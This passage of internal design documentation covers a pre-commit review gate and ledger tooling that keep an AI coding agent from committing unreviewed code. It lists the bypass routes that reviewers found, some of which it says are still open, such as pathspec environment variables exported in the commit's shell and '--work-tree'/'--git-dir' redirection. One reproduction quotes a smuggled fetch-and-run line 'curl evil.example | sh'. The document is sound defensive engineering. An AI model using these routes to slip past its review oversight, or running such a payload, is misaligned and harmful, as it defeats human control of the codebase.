# The Review-Boundary System

**Modules:** `~/.claude/hooks/precommit_review_gate.py` (the mechanical gate),
`~/.claude/hooks/record_review.py` (the code-review ledger writer),
`~/.claude/hooks/record_plan_review.py` (the plan-review ledger writer),
`~/.claude/hooks/review_risk_tier.py` (the advisory cost classifier),
`~/.claude/knowledge/model_policy.json` / `model_policy.md` (the machine-readable policy these
tools consult and are checked against).

## The rule

There are exactly two standing review points: plan review, before a substantial plan is implemented,
and code review, before each commit of a finished unit of work. Nothing else is a standing gate, and
the number never grows. A specialist auditor can substitute for the code reviewer (a trust-surface
commit goes to `trust-architect` instead of `code-reviewer`) but never stacks on top of it.

- **Code review is enforced before the commit.** Gate 3b of the Bash gate chain denies a `git
  commit` whose exact pending content has no review on record, or whose recorded review left
  blockers. Record a review with `record_review.py --pre-commit --clean --paths <the commit's
  paths>` (`--blockers <n>` in place of `--clean` when the review found blockers). It is keyed to a
  digest of `git diff HEAD -- <the commit's own pathspec>`, so editing a reviewed path re-opens the
  gate and other agents' edits elsewhere do not.
- **Plan review has no gate.** `record_plan_review.py` only logs the outcome, so the catch rate can
  be measured.
- **Review in batches.** The unit of review is a whole work item. Review it once, fix every finding
  in one parallel pass, then run one targeted check scoped to the whole change since the reviewed
  content, and repeat until clean. A check becomes a full review only when the fixes touched broad
  or risky logic, or the risk tier or the reviewer of record changed.
- **Cost follows risk.** `review_risk_tier.py` classifies a pathspec as `trivial`, `moderate` or
  `high`. Only a `trivial` change (docs or lock files) may use a cheaper-model confirmatory pass, and only
  with the test suite and lint passing; nothing is ever committed with no review at all. A `high`
  change always gets a full review.
- **Failure is open.** A review-tooling outage never wedges a commit. The only denials that
  recording a review cannot clear concern pathspecs the hook cannot resolve to real content.

The rest of this page is the mechanics. Dated corrections, fix-round narratives and machine-state
notes are collected, word for word, in the History section at the end.

## The two-boundary rule

`CLAUDE.md` §10 is explicit that there are exactly **two** standing Opus review points, never a
per-edit review: **plan review** (before implementation starts on a substantial plan) and **code
review** (at each commit boundary, now enforced *before* the commit rather than after). Nothing
else in this runtime is a standing review gate — the sanctioned-Opus extension (`CLAUDE.md`
§10/§13: `launch-director`, `test-architect`, `trust-architect`, `agentic-systems-architect`,
`code-quality-architect` and the other seats listed there) adds bounded periodic *audits* and named substitution roles, but none
of them stack an additional gate on top of the two boundaries above. `trust-architect` on a
trust-surface commit **substitutes for** `code-reviewer` as reviewer-of-record — it never runs in
addition to it (see "substitution never stacking" below).

Code review's boundary is mechanically enforced by gate 3b of the `pretooluse_bash.py` chain
(`precommit_review_gate.py`) — see `gate-chain.md` for where it sits in gate order. Plan review has
**no** mechanical gate at all: `record_plan_review.py`'s own module docstring says so directly —
"there is no gate that reads this ledger and blocks anything... Building that enforcement is a
real, separate, larger decision" (module docstring of `record_plan_review.py`). It exists purely so plan
review's actual catch rate becomes a measurable, evidence-backed question instead of an
unanswerable one — before this module, plan review had *zero* logged outcomes anywhere, ever
(verified 2026-08-20: no hook registration, no `~/.claude/.enforcement/log.jsonl` entries).

## Gate 3b: how an unreviewed commit is mechanically blocked

**File:** `hooks/precommit_review_gate.py`. Fires on every writing `git commit` (via
`css.should_guard(ev)`, the same commit-detection every other gate shares), between gate 3
(staged scope) and gate 3c/4 in the dispatcher's order.

### Why this replaced a post-commit gate

`CLAUDE.md` §10 records the operator's own reasoning for moving the boundary (2026-08-19): the
retired `task_completion_gate` (a `Stop`-hook check) asked "was HEAD reviewed?" *after* a commit
already existed — by which point a found blocker is a second commit, not a correction, and the
gate was keyed to a specific sha, so it could only ever fire once the thing it should have
prevented was already history. Gate 3b moves the question to a point that can still change the
outcome: **has the exact content this commit would land already been reviewed?**
(module docstring of `precommit_review_gate.py`).

### What "this content" means, and why it's keyed the way it is

The review key is the **digest of `git diff HEAD -- <the commit's own pathspec>`** — not a
filename, not a sha, not a whole-tree diff. Two properties fall out of scoping to the commit's
own declared paths, and both are explicitly called out in the module docstring as the reason
this design is *survivable* in a multi-agent tree:

1. **It's exactly what the commit will actually write.** `git commit -- <paths>` takes the
   working-tree content of those paths, so the reviewed bytes and the committed bytes are
   identical by construction.
2. **It's stable while other agents edit other files.** A whole-tree digest would change every
   few seconds in this environment and deny every commit forever — the entire mechanism would be
   an obstacle everyone learns to route around rather than a real gate. Scoping to the pathspec
   means only a change to a path *this specific commit already claims* can invalidate its review.

Practically: change a byte in a reviewed path after the review runs, and the digest moves and
the gate re-fires. That's the intended behavior, not a bug — you reviewed something that no
longer exists.

Untracked files named in the pathspec are folded into the digest too (bounded per-file and total
read caps — `_UNTRACKED_READ_CAP` 8MB, `_UNTRACKED_TOTAL_CAP` 64MB,
`_UNTRACKED_MAX_FILES` 2000 `parts` entries (roughly 1000 READABLE files, since the formatter
appends two entries per readable file — see the lossless-material entry below) — so a huge
generated artifact can't stall the hook).

### Storage: no new ledger, a synthetic key in the existing one

Gate 3b reuses the *same* file post-commit review used to use — `~/.claude/.review_state/
last_reviewed` — keyed on a synthetic `precommit:<16-char-digest>` string in place of a sha
(`PRECOMMIT_PREFIX = "precommit:"` in `precommit_review_gate.py`). A real git sha is 40 hex
characters, so this prefix can never collide with one; pre-commit and (any surviving) post-commit
entries coexist in one ledger with neither format needing to know about the other.

### Clearing the gate

```
python3 ~/.claude/hooks/record_review.py <repo> --pre-commit --clean --paths <the exact paths you are about to commit> \
  --reviewer <agent-type> --reviewer-agent-id <id> --reviewer-tool-use-id <id> < /dev/null
```

or `--blockers <n>` when the review found `n` unresolved blocker-severity findings — which
**keeps the gate closed** until they're fixed and a fresh review is recorded and passes clean.
Committing over a known blocker is precisely the thing this boundary exists to stop.

The three `--reviewer*` fields are the reviewer's IDENTITY, copied from its dispatch row in
`~/.claude/.agent_budget/spend.jsonl` (`agent_id` and `tool_use_id`), NEVER retyped. The recorder
joins `tool_use_id` to that ledger and writes `model=<tier> model_source=ledger`. Omitting them
still records, but logs `missing-reviewer-identity` and proves nothing about which model reviewed.

### `--rekey`: carrying a clean review forward across a staging-only digest move

`record_review.py --rekey <prior-precommit-key> --paths <paths>` (AA-0064, 2026-09-01
gate-optimization plan waste-elimination P3) is the mechanical fix for the specific case
`reference_precommit_digest_after_staging.md` used to document only as manual prose: an
**untracked** file contributes nothing to `git diff HEAD` (see the "what 'this content' means"
section above), so a file reviewed clean while untracked, then `git add`ed with byte-identical
content, moves the digest and re-fires the gate over content that never actually changed.

It carries the PRIOR entry's clean outcome forward to the CURRENT digest, but **only** when
`precommit_review_gate.rekey_digest_if_only_untracked_became_staged()` PROVES the two are
byte-identical over LOSSLESS material: it reconstructs what the pending diff would have looked
like with every newly-staged path treated as still-untracked (reusing `_format_untracked_entries()`
verbatim, never a re-derived approximation of it) and requires the reconstruction's SHA256 digest
to equal the prior key's exactly, AND requires that reconstruction to have hit none of
`_format_untracked_entries`'s own lossiness conditions (see the "Directory, glob, and
pathspec-magic entries reconstruct correctly" subsection below for what "lossless" means here and
why byte-identity alone was never sufficient). Five more safety checks beyond the digest
equality, added across the 2026-09-01, 2026-09-23, and 2026-09-24 cold-review fix rounds after each
was live-reproduced against the pre-fix build:

- **Mode check.** Every newly-staged path's real git file mode (`git diff HEAD --raw`) must be
  exactly `100644`, a plain regular file — refuses `100755` (an added executable bit) and
  `120000` (a symlink). The byte-only reconstruction reads content via a plain `open()`, which
  carries no mode bit and FOLLOWS a symlink to its target's content, so a file reviewed
  untracked-and-executable-cleared, then staged executable, or a file reviewed as a byte-identical
  copy of some other tracked file's content, then staged as a SYMLINK to it, both digested
  identically under the pre-fix predicate even though the commit would land completely different
  git objects.
- **Target-collision check.** `--rekey` refuses outright when the TARGET digest already has ANY
  entry on record — clean or not. Without this, a target digest already carrying, say, an
  unresolved `blockers:3` would be silently overwritten by `decide()`'s own STATUS_UPDATE path the
  moment a rekey call reached it, live-reproduced as the gate flipping from deny to allow over 3
  known blockers.
- **Lossless-material check (GH #5886 fix-round-3 BLOCKER B1, cold review, 2026-09-23).** A
  byte-identical SHA256 match against the reconstruction proves nothing when the reconstruction
  itself was LOSSY. `_format_untracked_entries` — the shared formatter both the real digest AND
  the `--rekey` reconstruction use — is lossy in **four** ways that never surface in the digest
  (corrected fix-round-8, same-text pass: this previously said "three," omitting the unreadable
  case that the very next paragraph already corrects): invalid UTF-8 is decoded with
  `errors="replace"` (two genuinely different byte sequences can decode to the identical
  replacement-laden string); any one file's content is read only up to an 8 MiB per-file cap
  (`_UNTRACKED_READ_CAP` — a change anywhere past that offset never reaches the digest); past a 64
  MiB aggregate cap (`_UNTRACKED_TOTAL_CAP`) OR `_UNTRACKED_MAX_FILES` (2000) `parts` ENTRIES —
  which, because this formatter appends TWO entries per readable file (a header line, then its
  decoded content), caps out after roughly **1000 readable files**, not 2000 (measured: 1000 of
  1500 rendered before collapsing) — every remaining file collapses into one `<capped after N
  entries>` marker carrying no content at all; and an UNREADABLE file's stat-only rendering
  (size/mtime mixed into the material instead of content) carries no real content either. Live-
  reproduced end to end through the real CLI and through the dispatcher's own printed `--rekey`
  hint: a large glob pathspec where a file past the readable-file cap was replaced after a clean
  review reconstructed identically either way (both versions hit the same cap and collapse to the
  same marker), and `--rekey` wrongly cleared a commit that never included the reviewed content.
  Fixed with a `lossy_sink` parameter threaded through `_format_untracked_entries` and
  `reconstruct_pending_diff_assuming_untracked`: when passed a list, it has an entry appended on
  **every** hit of any of the four conditions above (corrected fix-round-8, same-text pass: this
  previously said "the FIRST time" — the code appends unconditionally inside the per-file loop, so
  a caller counting entries sees the true number of lossy hits, not a single flag).
  `rekey_digest_if_only_untracked_became_staged` passes a fresh list and refuses outright the
  moment anything lands in it — REGARDLESS of whether the digest happens to match — logged and
  printed as the dedicated `rekey-lossy-material` reason (named here fix-round-8, same-text pass;
  see gate-chain.md's denial-reasons list for the full account, including why no amount of
  re-attempting the identical `--rekey` call can ever clear it). The digest
  GRAMMAR itself is completely unchanged by this (every existing ledger key still matches exactly
  the same bytes it always did); this is purely a caller-side refusal added on top.
  **Corrected 2026-09-24 (GH #5886 fix-round-4, R7-B2): an earlier version of this paragraph said
  an unreadable file is explicitly NOT counted as lossy. That is no longer true, and was corrected
  in fix-round-4 itself (R6-B1's own predecessor finding), not merely in this doc:** an unreadable
  file's stat-only rendering (size/mtime mixed into the material instead of content) carries no real
  content, so while a transition TO/FROM unreadable does move the digest (that transition's own
  distinct text), the REVERSE risk — two different genuinely-unreadable files coinciding on
  stat-only fields under attacker-controlled timing (e.g. both deleted-then-recreated with the same
  size/mtime) — is exactly the kind of coincidence this check exists to never bet safety on.
  `_format_untracked_entries` now appends `"unreadable:<rel>"` to `lossy_sink` for this case too, so
  `--rekey` refuses it exactly like the other three lossy conditions.
- **Control-character-safe naming (R6-B1, cold trust-architect review, GH #5886 fix-round-4,
  `precommit_review_gate._digest_safe_name`).** The `\n--- untracked <name> size=<n>\n` header line
  this formatter emits per entry used to render `<name>` VERBATIM, so a filename containing its own
  literal newline plus a fabricated `--- untracked <other-name>` fragment could digest
  BYTE-FOR-BYTE IDENTICALLY to two separate, genuinely different real files named the fabricated
  pieces — a single reviewed, weirdly-named directory entry reconstructing identically to two
  ordinary staged files, one smuggling unreviewed content, live-landed end to end through `--rekey`
  and gate 3b in the cold review's own repro. Fixed by rendering any name containing an ASCII
  control character (below `0x20`, or DEL/`0x7f`) as a `\0`-prefixed JSON string (`\0` is a byte no
  real git pathname can ever contain) instead of the raw name — `json.dumps` unambiguously escapes
  every embedded control character, quote, and backslash, so the fabricated-boundary trick cannot
  reproduce itself inside the JSON string either. Every existing name with no control character
  renders byte-identically to before this fix; only the control-character case changed.
- **Digest-format version marker (R7-B1, cold trust-architect review, GH #5886 fix-round-4,
  ledger field `dg=`).** The control-character-safe naming fix above closes the fabricated-boundary
  exploit for any digest computed AFTER the fix landed — but `--rekey`'s whole point is carrying a
  PRIOR review's outcome forward onto new content, and a review recorded BEFORE this fix existed
  used the old, vulnerable rendering to produce its digest. Without a way to tell old digests apart
  from new ones, `--rekey` could still be pointed at a pre-fix digest and exploited exactly the same
  way, live-reproduced end to end (a single oddly-named reviewed directory entry, rekeyed onto two
  ordinary staged files, one smuggling `os.system('curl evil.example | sh')`). Fixed by stamping a
  digest-format version field, `dg=2`, on every NEW `--pre-commit` and `--rekey` ledger entry
  (`record_review._DIGEST_FORMAT_VERSION`) — `"2"` names the current, R6-B1-fixed rendering.
  `--rekey` now refuses outright unless the chain's ROOT entry (the true root after one-hop
  resolution — see the ledger-format section below) already carries `dg=2`; an entry with no `dg=`
  field at all — every entry recorded before this fix existed, by construction — refuses, fail-closed,
  exactly like the other lossy-material refusals above. The refusal path is a fresh full review,
  never a silent downgrade or a second, weaker verification path. See `record_review._entry_suffix`'s
  own docstring for the full field contract.

Also refuses (never a silent accept): the prior key is not `precommit:<16-hex>`-shaped, no
`--paths` supplied, the prior key has no review on record at all, the prior review's own outcome
was UNKNOWN or `blockers:N` (only a prior CLEAN ever carries forward), or combined with
`--pre-commit`/`--clean`/`--blockers` (mutually exclusive — `--rekey` always carries forward the
prior CLEAN outcome by construction, never a caller-declared one). On success the recorded entry
carries the prior entry's `reviewer=`/`model=` identity forward (unless the caller explicitly
supplies its own) plus a `rekey=<prior-key>` provenance field — see the ledger-format section
below for what that field is for.

**Directory, glob, and pathspec-magic entries reconstruct correctly (fixed 2026-09-23, GH #5886).**
A `--paths` entry that names a directory, a glob or a pathspec-magic form is reconstructed by
letting git decide both halves of the partition, never a Python approximation of either. The
tracked-diff half excludes force-untracked files with git's own `:(exclude,literal)<path>` magic;
the `,literal` modifier is load-bearing, because a bare `:(exclude)` is a glob and a force-untracked
path whose name contains `*`, `?`, `[` or the `\` glob escape would also exclude a different,
tracked, modified sibling and let the byte-identity check succeed over a commit that contains an
unreviewed edit. The untracked half is `git ls-files --others` (scoped to the pathspec) UNION the
force-untracked set, which is itself derived from `git diff --name-status` added paths
(`_added_paths`) under the same pathspec. The SHA256 byte-identity check, the plain-regular-file
mode check and the lossless-material check together are the safety boundary; widening the membership
only decides which names get a fair, git-accurate chance to reconstruct their content, and a
directory, glob or magic-shaped pathspec still refuses on any real content difference, exactly like
a plain file path.

(An earlier attempt stripped the four `GIT_*_PATHSPECS` variables from the gate's own git
subprocesses. It was a regression against the previous behavior and was reverted; the narrative is
in History. What replaced it follows.)

**Fixed round-4 (R6-B2) by REFUSING WHEN SET, never stripping.** `precommit_review_gate.decide()`
checks `pathspec_env_vars_present()` immediately after the command-substitution check — before any
digest is computed, needing neither `repo_root` nor `paths` — and denies with the dedicated
`REASON_PATHSPEC_ENV_SET` (`"pathspec-env-set"`) the instant any of the four vars is present in the
environment. This reason is NEVER clearable by recording a review (mirrors `REASON_UNRESOLVABLE`'s
own contract exactly): this is not a review gap, it is an environment that makes "this content"
ambiguous, and the only fix is to unset the variable and re-issue the commit. `record_review.py`'s
`--pre-commit` and `--rekey` modes run the identical check before computing or reconstructing
anything at all, refusing with a clear, named message rather than silently proceeding under a
semantics the real commit might not share.

**What refusing removes, precisely, and what it explicitly does not (corrected AGAIN fix-round-8
B1 — the paragraph below previously said an EXPORTED var is caught; that is false for every
`export` made through the Bash tool, in the same shell invocation as the commit or an earlier one,
and is corrected here, not merely flagged).** The PreToolUse hook runs as a process SEPARATE from the Bash tool's shell,
and it only ever sees the environment it was itself launched with — nothing the gated command
sets, exports, or persists at its own run time ever reaches the hook's process, regardless of
whether that happens via an inline `VAR=value` prefix or a plain `export`/`env`/`set -a`, in the
same shell invocation or an earlier one. `e2e/x4.py` proves the same-invocation shapes live; the
cross-invocation case follows from this architecture (every Bash tool call runs in its own shell,
and the hook inherits from none of them) and has no separate repro. Refusing the moment a var is PRESENT in THIS HOOK'S OWN
environment closes exactly one case: a variable that was ALREADY set in the hook's own inherited
environment BEFORE the gated command ever ran (e.g. baked into Claude Code's own launch
environment) — there, there is no longer a semantics this module computes that the real commit
might not share, because neither one is ever trusted to proceed while the var is set. What this
does NOT close, and is DEMONSTRATED LIVE as still open (not merely "not demonstrated," see the
correction recorded in History): an inline `VAR=value` prefix set only on the commit line itself (`e21.py`); an
`export`/`env`/`set -a` of the SAME variable run earlier in the identical shell invocation as the
commit, whether `;`-separated or `&&`-chained (`e2e/x4.py`, fix-round-8 B1) — the hook's own
`os.environ` never has the var either way, confirmed by inspecting it from inside the hook process
itself; the git CLI's own
`--literal-pathspecs`/`--glob-pathspecs`/`--noglob-pathspecs`/`--icase-pathspecs` command-line
options passed directly on the commit; or `--work-tree`/`--git-dir` redirecting which repository or
working tree the real commit acts on. **These remain open vectors this module does not defend
against, tracked on #5892 — stated here plainly, not glossed over.**

Individual file paths remain the RECOMMENDED shape for both the original review and a later
`--rekey` — not because anything still structurally requires it, but because a directory or glob
commonly sweeps in files that were not reviewed together, which makes a `--rekey` attempt refuse
for an unrelated reason far more often than a single-file pathspec would. `record_review.py
--pre-commit` prints a non-blocking warning when a `--paths` entry is a directory that currently
holds untracked files, pointing at this rekey behavior — and, as of the round-2 fix, that warning
now correctly fires even when the recording command is issued from a SUBDIRECTORY of the repo (the
`ls-files` lookup that detects the untracked content now runs from the same cwd the directory
token is typed relative to, instead of unconditionally from the repo root — the two silently
disagreed whenever a commit was issued from anywhere but the toplevel).

**`--rekey` also refuses, as defense in depth, on an outright path-set mismatch.** When the prior
entry cited by `--rekey` recorded its own `paths=` telemetry, a `--rekey` call whose CURRENT
`--paths` set (order-independent, sanitized the same way the ledger write itself sanitizes) differs
from it is refused with a specific message, before the reconstruction is even attempted. The
byte-identity check already refuses a genuine content difference on its own in most cases — this
check catches outright misuse (citing one review's key while typing an unrelated `--paths` list)
with a clear, targeted message instead of relying solely on the reconstruction failing for what
would otherwise look like an unrelated reason. An entry with no `paths=` field at all (an older,
pre-telemetry ledger line) is not checked — today's behavior is unchanged for it.

**BLOCKER B2 (GH #5886 fix-round-3, cold review): this check's ORIGINAL form refused every honest
rekey of 13 or more paths.** The ledger's own `paths=` field keeps at most `_MAX_PATHS_IN_FIELD`
(12) entries — `_paths_field` truncates it there and records the true total separately as
`paths_n=`. Comparing the (truncated-to-12) stored set against the FULL current set for exact
equality meant a genuinely honest rekey of 13+ paths could never pass: the stored record is, by
construction, missing entries the original review actually covered. Fixed by also reading the
prior entry's own `paths_n=`: when it exceeds the 12-entry cap (proof the stored `paths=` is
itself an incomplete record, not a truncated-but-complete one), the check instead requires (a) the
stored (truncated) set to be a SUBSET of the current set — re-verifying every path the ledger
managed to store — and (b) the current set's size to exactly equal the recorded `paths_n`. Both
halves are necessary: a subset check alone would silently accept a current `--paths` set that adds
one extra, never-reviewed path on top of the honest truncated 12 — live-reproduced with an
ALREADY-COMMITTED, UNCHANGED extra file (contributing zero diff either way, so the byte-identity
check alone does not catch it) smuggled into the `--paths` list alongside a genuine 13-path rekey.
When `paths_n` is absent, unparsable, or does not exceed the cap, behavior is completely unchanged:
exact-set equality against the (complete) stored set.

**`paths_n=` counts DISTINCT sanitized paths, not the raw `--paths` count (non-blocking, GH #5886
fix-round-4, cold review).** `_paths_field` dedupes on the SANITIZED value (`_safe_path_component`'s
narrower charset than the ledger's general field sanitizer) before computing `paths_n` — the same
set a later `--rekey` call's own paths-mismatch check above compares against. Before this fix,
`paths_n` was the raw input length: an honest 13-distinct-path review whose `--paths` happened to
carry one literal duplicate (or two raw strings that collide after sanitization) recorded
`paths_n=14`, which a later honest 13-distinct-path `--rekey` call could never match — a false
refusal (never a safety gap; the byte-identity check still refuses any REAL smuggled content
regardless), fixed by construction.

**The hint.** When gate 3b denies an `unreviewed-commit` and a CLEAN entry already exists for the
exact same `--paths` set (compared via the `paths=` ledger telemetry field, sanitized-set
equality, order-independent) at a DIFFERENT digest, the denial message prints the exact `--rekey`
command to try — a hint only; `decide()`'s own block/allow logic is completely unchanged by its
presence or absence. It is still never printed for a directory-shaped pathspec, but for a
narrower reason than before: reconstruction now works correctly for a directory (see above), yet a
directory pathspec commonly sweeps in files beyond the set that was reviewed together, so the
suggested command would most likely refuse for an unrelated cause; the suppression avoids
advertising a command that is unlikely to succeed, not one that cannot.

### `--correct-identity`: fixing a mistyped reviewer identity without losing the audit trail

`record_review.py --correct-identity <key> --reviewer <type> [--reviewer-agent-id <id>
--reviewer-tool-use-id <id>]` (#5133, 2026-09-09) corrects ONLY the recorded `reviewer=`
identity for an EXISTING ledger entry — never the outcome, paths, digest, or any other telemetry
field. Before this existed, a mistyped `--reviewer-tool-use-id` was permanent: re-recording the
same digest was refused (`decide()`'s `STATUS_ALREADY`), so a typo was indistinguishable from a
genuinely forged identity to any later audit forever.

**Storage: append, never overwrite.** A correction is written as a NEW ledger line at the SAME
`repo_root`+key as the original — the original (wrong) line stays on disk, readable in full.
Every real consumer of this ledger (`precommit_review_gate.decide()`, `head_review_reviewer_identity`,
`find_clean_precommit_entry_for_paths`) already resolves "the last line for this key wins," so a
correction is picked up automatically with zero parser changes, exactly like a `--rekey`/
`STATUS_UPDATE` line. A silent in-place overwrite was deliberately rejected: it would make forgery
*easier* (a forger could "correct" a fabricated identity into a copied real one with no trace at
all). The corrected line carries a `corrects_from=<old reviewer value>` field naming exactly what
it superseded, plus a `corrected_at=<UTC ISO8601>` field stamped at the moment of the correction
itself — see the field-list section below for why `corrected_at` is a sibling field, never a
mutation of `ts=`.

**Refuses loudly, matching every other mode in this module:** the key doesn't match
`precommit:<16-hex>`/`sha:<7-40-hex>`, no prior entry exists for that exact key at all, the prior
entry has no `reviewer=`/telemetry fields to correct (a bare legacy line), the corrected value is
identical to what's already on record (idempotent no-op), or the caller tries to combine it with
`--pre-commit`/`--rekey`/`--battery`/`--clean`/`--blockers` (a correction changes identity only,
never the outcome or targets a freshly-computed digest). **Also refuses `--warm`/`--round`/
`--prev`/`--paths`/`--model`** (2026-09-09 fix round, F4): these used to be silently accepted with
zero effect — `_rebuild_corrected_token` never even reads them, it only ever touches
`reviewer=`/`corrects_from=`/`corrected_at=` — so a caller who copy-pasted a warm-round recording
command and swapped in `--correct-identity` would reasonably believe they were carried into the
correction when nothing happened. Refused loudly instead, naming that correction mode changes the
recorded reviewer identity only.

**Double-correction is idempotent-shaped, not additive** (2026-09-09 fix round, F5): correcting an
ALREADY-corrected line replaces its `corrects_from=`/`corrected_at=` tokens IN PLACE rather than
appending a second pair of them — the earlier implementation always appended, so a second
correction produced two `corrects_from=` tokens on one line, and `parse_ledger_fields`'s last-wins
parsing silently dropped the first from every structured reader's view (not lost from the raw
line, just invisible to any consumer that isn't reading byte-for-byte). The final line therefore
always names only the IMMEDIATELY PRIOR reviewer value as `corrects_from=`; the full multi-hop
chain stays reconstructable by walking the ledger's own successive lines for that key, exactly how
`superseded`/last-wins already works for every other field.

**The audit-side mirror: `audit_review_attribution.py`'s `superseded` verdict.** A `clean` entry
that is not the LAST entry on record for its exact `(repo, key)` pair — i.e. a
`--correct-identity` correction (or any other later recording for the same key) appended a newer
line afterward — is attributed `superseded` and excluded from `flagged`: it is dead history no
real consumer ever reads again, not a permanent, forgery-shaped anomaly. See
`telemetry-and-spend.md`'s `audit_review_attribution.py` section for the pair-freeing laundering
hole this exemption originally opened, and the fix that closes it.

### Fail-open, with one narrow, deliberate exception

Every ordinary failure path allows the commit through: unresolvable repo root, unreadable
ledger, a `git` error, an empty diff (nothing to review), or any unexpected exception
(module docstring of `precommit_review_gate.py`). A review-tooling outage must never wedge a session — the
house rule for every gate in this chain.

The one deny reason that **cannot** be cleared by recording a review is
`unresolvable-pathspec` — a pathspec token the hook literally cannot resolve to real content:
an unexpanded `$VAR`, an unquoted `$(...)`/backtick command substitution inside the pathspec
region, or a leading `~`. The module documents in detail *why* this needed a dedicated, careful
check rather than a simple per-token character scan
(`command_has_unquoted_command_substitution()` in `precommit_review_gate.py`): `_lib`'s
own shared tokenizer treats a bare `$(` or backtick as a **segment boundary** (deliberately, so
gate 1 can find a hidden `git checkout` hidden inside a subshell), which means by the time a
pathspec token reaches this gate, an unquoted command-substitution construct has already been
torn *out* of it — `git commit -- report$(cmd).html` fragments into a pathspec token that
contains no shell metacharacter at all and typically resolves to nothing tracked, which a naive
"empty diff = nothing to review" rule would then wave through **unreviewed**. Fixed by scanning
the *raw* command text (the one place that still has the full, unfragmented pathspec region) for
this specific shape, bounded to the region between a bare `--` and the next unquoted control
operator. A token flagged by the broader per-character `_SHELL_META` scan is *excused* when git
or the filesystem confirms it denotes something real (a legitimate filename like `report
(1).html`) — but `$`, backtick, and `{` are deliberately **never** excusable this way, because a
real file happening to share that literal name says nothing about what an *unquoted* occurrence
of the same characters would expand to before git ever sees it (`_SHELL_META`, `_EXCUSABLE_VIA_REAL_CONTENT` and `_token_resolves_to_real_content()` in `precommit_review_gate.py`).

## The risk-tier ladder: trivial / moderate / high

**File:** `hooks/review_risk_tier.py`. **Not a hook** — it isn't wired into
`pretooluse_bash.py` and blocks nothing on its own. `CLAUDE.md` §10 used to *claim* review was
"cost-gated," and this was verified false on 2026-08-20: no such classifier existed anywhere,
so every review — trivial or not — paid full adversarial-Opus cost. `review_risk_tier.py` is a
pure, deterministic classifier an **orchestrating agent is instructed to consult** before
deciding which review tier to run; compliance is a documented process, not a mechanical gate,
and the module says so plainly: "was the RIGHT TIER of review used" isn't answerable from a
`git commit` tool call the way gate 3b's "was a review recorded at all" is
(module docstring of `review_risk_tier.py`).

`classify(paths) -> (tier, reason)`:

- **`high`** — a single matching path anywhere in the change forces `high`, regardless of what
  else is trivial in the same commit (this only ever *widens* toward more review, never
  narrows). Triggered by any of:
  - A whole path segment in `{"hooks", "agents", ".github", "schedules"}`
    (`_HIGH_RISK_DIR_SEGMENTS`) — matched as a full segment on the *normalized* path (so
    `hooks/tests/../foo.py` can't defeat it via `..` traversal, and `my_hooks_helper.py` doesn't
    false-positive on the substring). A test-shaped path under one of these directories is
    exempted from inheriting `high` from the directory rule alone (it can still be forced high by
    a keyword/basename hit) — editing a *test* under `hooks/tests/` only adds verification, it
    can't weaken enforcement the way editing the enforcement logic or an agent's prompt itself
    can (`review_risk_tier.py:_is_high_risk`).
  - An exact basename: `settings.json`, `claude.md` (case-insensitive — the operating contract
    itself, in *any* repo), `firestore.rules`, `storage.rules`, `allowlist.json`.
  - A substring keyword match against money (`pricing`, `billing`, `stripe`, `estimate`,
    `markup`, ...), identity/access (`auth`, `permission`, `license`, `session`, `secret`,
    `token`, ...), irreversible data-shape changes (`migration`, `schema`, `firestore`), or
    deploy/infra (`cloudbuild`, `terraform`, `deploy`) — this is the runtime-wide BASE list,
    deliberately repo-agnostic, **plus the calling repo's own `security.extra_risk_keywords`**
    from `<repo>/.claude/oversight/manifest.json` (resolved from the classifying process's own
    cwd via `git rev-parse --show-toplevel`, never a hardcoded path or another repo's manifest —
    `review_risk_tier.py:_repo_extra_keywords`). ExampleApp's manifest carries
    `["catalog"]`, so a CSA catalog path still classifies `high` there; the same path run with
    no repo/manifest present classifies `moderate` instead. Deliberately broad and
    substring-based — under-matching here is the leak direction, so the module errs toward
    flagging more than strictly necessary (`review_risk_tier.py:_HIGH_RISK_KEYWORDS`).
- **`trivial`** — *every* changed path is docs-only (`.md`/`.rst`, or `.html` **outside** a
  `templates/` directory — an app template is not documentation prose even though it ends in
  `.html`) or a recognized lock/generated file (`package-lock.json`, `yarn.lock`, `poetry.lock`,
  ...), **and** none of them also match a `high` pattern. Full Opus review *may* be replaced with
  a cheaper-model confirmatory pass plus the existing test suite/lint actually passing — **never**
  with zero review of any kind. Test-only changes are **deliberately excluded** from `trivial`
  even when nothing else is risky: a diff that only deletes assertions or adds a `skip`
  decorator is exactly the shape review exists to catch, so the lowest tier is withheld from it on
  principle, not oversight (`review_risk_tier.py:_is_test`).
- **`moderate`** — everything else, the default, including test-only changes and an empty or
  unclassifiable pathspec (an empty pathspec is explicitly *not* treated as "verified safe to
  skip review" — it classifies moderate, not trivial, `review_risk_tier.py:classify`).

The module's own history is a useful trust signal: a 2026-08-20 review of its *first* version
found it under-classifying into `trivial` in four separate ways (agent prompts other than the two
reviewer files, `.txt` manifest files treated as docs, test-only changes graded trivial, and a
`..`-traversal bypass of the directory-segment rule) — all four are fixed in the current version
and documented inline as the reason each check exists (the "ROUND-2 REVIEW" paragraph of the `review_risk_tier.py` module docstring).

`CLAUDE.md` §10's high-risk pattern list matches the code closely but is explicitly
non-exhaustive ("see the module for the full list") — one minor gap worth noting: the prose
enumerates `hooks/`, `agents/`, `schedules/`, `CLAUDE.md`, `settings.json`,
`firestore.rules`/`storage.rules`/`allowlist.json`, and the keyword categories, but doesn't
separately call out `.github/` even though it's in the code's `_HIGH_RISK_DIR_SEGMENTS`. Not a
contradiction — the prose disclaims completeness — just a detail that only the code carries.

## The fix-round discipline

**The rule now in force is batch reviews (operator directive 2026-10-09; `CLAUDE.md` §10).** The
unit of review is a whole work item, train slice or plan, never each small edit. Build the whole
unit first, in parallel; review it once; split the findings by file and fix all of them in one
parallel pass; then run ONE targeted check whose scope is the whole change since the reviewed
content (every hunk the fixes touched, not only the findings list, because fix-introduced defects
sit outside the reported lines). Before every check, re-run `review_risk_tier.py` and re-derive the
reviewer of record; if either changed, or the fixes touched broad or risky logic, that check is a
full round by the (new) reviewer of record. A clean or nits-only result means commit; leftover
non-blocking items become an issue, never another round. A further round is warranted only for a NEW
blocker in money, security, PHI or tenancy, and then it is one targeted check and stop. A round-1
blocker that a fix did not resolve, or that the fix introduced, is fixed and gets one more targeted
check of that fix only. The stop is the 3-strike rule (`CLAUDE.md` §11). A unit is no bigger than
one reviewer can read thoroughly (split above roughly 1,500 changed lines). Plans follow the same
rule.

The targeted check is the same falsifiability discipline `CLAUDE.md` §6 requires everywhere else:
does a test go red without the specific fix and green with it, for exactly the reported defect, with
the existing suite still green overall. This replaced the earlier per-round ladder (a
two-targeted-round cap, a forced full re-review on the `high` tier, and a cold full round after the
